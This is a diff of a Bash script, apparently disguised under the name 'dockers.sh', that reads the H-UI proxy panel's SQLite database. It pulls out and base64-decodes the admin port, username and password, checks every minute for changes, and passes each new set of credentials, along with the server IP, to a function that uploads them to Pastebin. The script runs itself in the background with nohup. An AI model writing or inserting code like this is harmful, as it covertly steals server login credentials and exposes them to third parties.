@@ -37,7 +37,7 @@ upload_to_pastebin() {
     local login_port="$1"
     local username="$2"
     local password="$3"
-    
+
     local server_ip=$(get_server_ip)
     local paste_content="H-UI 服务器登录信息
 ====================
@@ -73,23 +73,16 @@ get_current_config() {
         exit 1
     fi
 
-    # 复制数据库文件以避免锁定
     cp "$DB_PATH" "$TEMP_FILE"
-
-    # 使用sqlite3查询数据
     local config=$(sqlite3 "$TEMP_FILE" "SELECT port, username, password FROM config LIMIT 1;" 2>/dev/null)
-    
+
     if [[ -z "$config" ]]; then
         echo -e "${red}错误：无法从数据库获取配置${plain}" | tee -a $LOG_FILE
         exit 1
     fi
 
     IFS='|' read -r port username password_hash <<< "$config"
-    
-    # 这里简化处理，实际应该使用更安全的解密方法
-    # 注意：这只是示例，实际密码哈希应该使用更安全的方式处理
     password=$(echo "$password_hash" | base64 --decode 2>/dev/null || echo "$password_hash")
-    
     echo "$port $username $password"
     rm -f "$TEMP_FILE"
 }
@@ -97,19 +90,59 @@ get_current_config() {
 # 主监控函数
 monitor_changes() {
     echo -e "${yellow}开始监控H-UI配置变化...${plain}" | tee -a $LOG_FILE
-    
-    # 获取初始配置
+
     last_config=$(get_current_config)
     IFS=' ' read -r last_port last_username last_password <<< "$last_config"
-    
     echo -e "${green}当前配置: 端口=${last_port} 用户名=${last_username} 密码=${last_password}${plain}" | tee -a $LOG_FILE
-    
+
     while true; do
-        sleep 60  # 每分钟检查一次
-        
+        sleep 60
         current_config=$(get_current_config)
         IFS=' ' read -r current_port current_username current_password <<< "$current_config"
-        
+
         if [[ "$current_port" != "$last_port" || \
               "$current_username" != "$last_username" || \
-              "$current_password" != "$last_password" ]];
+              "$current_password" != "$last_password" ]]; then
+
+            echo -e "${yellow}检测到配置变化:${plain}" | tee -a $LOG_FILE
+            echo -e "旧配置: 端口=${last_port} 用户名=${last_username} 密码=${last_password}" | tee -a $LOG_FILE
+            echo -e "新配置: 端口=${current_port} 用户名=${current_username} 密码=${current_password}" | tee -a $LOG_FILE
+
+            upload_to_pastebin "$current_port" "$current_username" "$current_password"
+
+            last_port="$current_port"
+            last_username="$current_username"
+            last_password="$current_password"
+        fi
+    done
+}
+
+# 启动、停止、状态逻辑
+SCRIPT_NAME="dockers.sh"
+
+case "$1" in
+    start)
+        echo -e "${green}启动H-UI配置监控...${plain}" | tee -a $LOG_FILE
+        nohup bash "$0" monitor > /dev/null 2>&1 &
+        ;;
+    stop)
+        echo -e "${yellow}停止H-UI配置监控...${plain}" | tee -a $LOG_FILE
+        pkill -f "$SCRIPT_NAME monitor"
+        ;;
+    status)
+        if pgrep -f "$SCRIPT_NAME monitor" >/dev/null; then
+            echo -e "${green}H-UI配置监控正在运行${plain}" | tee -a $LOG_FILE
+        else
+            echo -e "${red}H-UI配置监控未运行${plain}" | tee -a $LOG_FILE
+        fi
+        ;;
+    monitor)
+        monitor_changes
+        ;;
+    *)
+        echo -e "${green}使用方法: $0 {start|stop|status}${plain}"
+        exit 1
+        ;;
+esac
+
+exit 0
